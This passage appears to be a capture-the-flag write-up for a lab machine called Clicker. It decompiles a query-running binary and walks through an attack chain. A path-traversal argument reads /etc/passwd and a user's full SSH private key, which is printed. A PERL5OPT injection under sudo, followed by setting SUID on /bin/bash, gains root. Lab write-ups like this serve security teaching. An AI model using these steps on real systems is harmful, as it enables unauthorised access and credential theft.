We decided to copy this binary to our local machine and decompile it. The decompiled code showed that this program accepted a numeric argument (1-4) and executed `SQL` queries based on that argument. If the argument was greater than 4, it ran queries from a file specified as the second argument.

```c

undefined8 main(int param_1,long param_2)

{
  int iVar1;
  undefined8 uVar2;
  char *pcVar3;
  size_t sVar4;
  size_t sVar5;
  char *__dest;
  long in_FS_OFFSET;
  undefined8 local_98;
  undefined8 local_90;
  undefined4 local_88;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined local_28;
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  if (param_1 < 2) {
    puts("ERROR: not enough arguments");
    uVar2 = 1;
  }
  else {
    iVar1 = atoi(*(char **)(param_2 + 8));
    pcVar3 = (char *)calloc(0x14,1);
    switch(iVar1) {
    case 0:
      puts("ERROR: Invalid arguments");
      uVar2 = 2;
      goto LAB_001015e1;
    case 1:
      strncpy(pcVar3,"create.sql",0x14);
      break;
    case 2:
      strncpy(pcVar3,"populate.sql",0x14);
      break;
    case 3:
      strncpy(pcVar3,"reset_password.sql",0x14);
      break;
    case 4:
      strncpy(pcVar3,"clean.sql",0x14);
      break;
    default:
      strncpy(pcVar3,*(char **)(param_2 + 0x10),0x14);
    }
    local_98 = 0x616a2f656d6f682f;
    local_90 = 0x69726575712f6b63;
    local_88 = 0x2f7365;
    sVar4 = strlen((char *)&local_98);
    sVar5 = strlen(pcVar3);
    __dest = (char *)calloc(sVar5 + sVar4 + 1,1);
    strcat(__dest,(char *)&local_98);
    strcat(__dest,pcVar3);
    setreuid(1000,1000);
    iVar1 = access(__dest,4);
    if (iVar1 == 0) {
      local_78 = 0x6e69622f7273752f;
      local_70 = 0x2d206c7173796d2f;
      local_68 = 0x656b63696c632075;
      local_60 = 0x6573755f62645f72;
      local_58 = 0x737361702d2d2072;
      local_50 = 0x6c63273d64726f77;
      local_48 = 0x62645f72656b6369;
      local_40 = 0x726f77737361705f;
      local_38 = 0x6b63696c63202764;
      local_30 = 0x203c20762d207265;
      local_28 = 0;
      sVar4 = strlen((char *)&local_78);
      sVar5 = strlen(pcVar3);
      pcVar3 = (char *)calloc(sVar5 + sVar4 + 1,1);
      strcat(pcVar3,(char *)&local_78);
      strcat(pcVar3,__dest);
      system(pcVar3);
    }
    else {
      puts("File not readable or not found");
    }
    uVar2 = 0;
  }
LAB_001015e1:
  if (local_20 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}

```

We tested this by running `SQL` queries to create, populate, reset passwords, or clean the database. It worked as expected, but it also displayed the SQL query contents.

```shell
bash-5.1$ /opt/manage/execute_query 1
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
CREATE TABLE IF NOT EXISTS players(username varchar(255), nickname varchar(255), password varchar(255), role varchar(255), clicks bigint, level int, PRIMARY KEY (username))
--------------

--------------
INSERT INTO players (username, nickname, password, role, clicks, level) 
        VALUES ('admin', 'admin', 'ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82', 'Admin', 999999999999999999, 999999999)
        ON DUPLICATE KEY UPDATE username=username
--------------

bash-5.1$ 
bash-5.1$ 
bash-5.1$ /opt/manage/execute_query 2
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
INSERT INTO players (username, nickname, password, role, clicks, level) 
        VALUES ('ButtonLover99', 'ButtonLover99', sha2('BestGameinHistory',256), 'User', 10000000, 100)
        ON DUPLICATE KEY UPDATE username=username
--------------

--------------
INSERT INTO players (username, nickname, password, role, clicks, level) 
        VALUES ('Paol', 'Paol', sha2('Yeah_What_a_Nickname',256), 'User', 2776354, 75)
        ON DUPLICATE KEY UPDATE username=username
--------------

--------------
INSERT INTO players (username, nickname, password, role, clicks, level)
        VALUES ('Th3Br0', 'Th3Br0', sha2('Brohhhhhhhhhh',256), 'User', 87947322, 1)
        ON DUPLICATE KEY UPDATE username=username
--------------

bash-5.1$ 
bash-5.1$ /opt/manage/execute_query 3
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
UPDATE players SET password='ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82' WHERE username='admin'
--------------

bash-5.1$ 
bash-5.1$ /opt/manage/execute_query 4
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
DELETE FROM players WHERE username != 'admin'
--------------

bash-5.1$ 
```

Finally, we exploited this program by running it with the argument `1337`, followed by the path to the `/etc/passwd` file, which resulted in the program to display the content of the `/etc/passwd` file. 

```shell
bash-5.1$ /opt/manage/execute_query 1337 ../../../etc/passwd
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
jack:x:1000:1000:jack:/home/jack:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
_rpc:x:115:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:116:65534::/var/lib/nfs:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
--------------

ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
' at line 1
bash-5.1$ 
```

```shell
bash-5.1$ /opt/manage/execute_query 1337 ../.ssh/id_rsa
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
-----BEGIN OPENSSH PRIVATE KEY---
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
-----END OPENSSH PRIVATE KEY---
--------------

ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '-----BEGIN OPENSSH PRIVATE KEY---
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAA' at line 1
bash-5.1$ 
```

By using the same method, we were able to access the contents of the user's SSH key and establish a connection to the system as the user `Jack`.

```bash
┌──(kali㉿kali)-[~]
└─$ ssh -i id_rsa jack@clicker.htb
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-84-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Oct 28 08:26:31 AM UTC 2023

  System load:           0.080078125
  Usage of /:            54.0% of 5.77GB
  Memory usage:          28%
  Swap usage:            0%
  Processes:             275
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.232
  IPv6 address for eth0: dead:beef::250:56ff:feb9:f67d


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Oct 27 14:56:02 2023 from 10.10.14.190
-bash-5.1$ id; hostname
uid=1000(jack) gid=1000(jack) groups=1000(jack),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
clicker
-bash-5.1$ 
```

# PRIVILEGE ESCALATION TO ROOT

```shell
-bash-5.1$ sudo -l
Matching Defaults entries for jack on clicker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack may run the following commands on clicker:
    (ALL : ALL) ALL
    (root) SETENV: NOPASSWD: /opt/monitor.sh
-bash-5.1$ 
```

We found that `jack` had special permissions to execute a script called `/opt/monitor.sh` as the `root` user without needing a password. The interesting thing about this script was that it used a Perl-based program called `xml_pp`.

```shell
-bash-5.1$ cat /opt/monitor.sh 
#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Error, please run as root"
  exit
fi

set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
unset PERL5LIB;
unset PERLLIB;

data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
/usr/bin/xml_pp <<< $data;
if [[ $NOSAVE == "true" ]]; then
    exit;
else
    timestamp=$(/usr/bin/date +%s)
    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
fi
-bash-5.1$
```

After some research, we discovered a technique described in a blog post [here](https://www.elttam.com/blog/env/) that allowed us to exploit the situation. By manipulating the `PERL5OPT` environment variable, we could inject malicious code. In this case, we ran the `id` command as `root` to confirm the success of the exploit.

```shell
-bash-5.1$ sudo -E 'PERL5OPT=-Mbase;print(`id`);exit' /opt/monitor.sh 
uid=0(root) gid=0(root) groups=0(root)
```

We also created a script that added the setuid (`SUID`) bit to `/bin/bash`. This bit allows the script to be executed with the permissions of the file's owner, which in this case is `root`. Using the previously mentioned technique, we executed our script, granting us root access.

```shell
-bash-5.1$ cat script.sh 
#!/bin/sh

chmod +s /bin/bash
-bash-5.1$ 
-bash-5.1$ 
-bash-5.1$ sudo -E 'PERL5OPT=-Mbase;print(`./script.sh`);exit' /opt/monitor.sh 
-bash-5.1$ 
-bash-5.1$ 
-bash-5.1$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1396520 Jan  6  2022 /bin/bash
-bash-5.1$ 
-bash-5.1$ 
-bash-5.1$ bash -p
bash-5.1# 
bash-5.1# 
bash-5.1# id
uid=1000(jack) gid=1000(jack) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),1000(jack)
bash-5.1# 
bash-5.1# 
```

This straightforward approach enabled us to escalate our privileges to the highest level, giving us full control over the system.

# CONCLUSION

In conclusion, our journey began with enumerating an `NFS` share, allowing us to obtain a backup of the website's backend code. From there, we leveraged a `broken access control` vulnerability to elevate our privileges to `admin` status on the website.

Subsequently, we used a `file write` feature to achieve `remote code execution`, granting us a shell with `www-data` privileges. Then, we decompiled a binary to exploit an arbitrary file read issue, which enabled us to read a local user's `SSH` key.

Finally, we manipulated an `environment variable` to attain root-level access on the system, completing our journey in this challenge. 

We appreciate your time and interest in our adventure, and we hope you found it engaging and informative.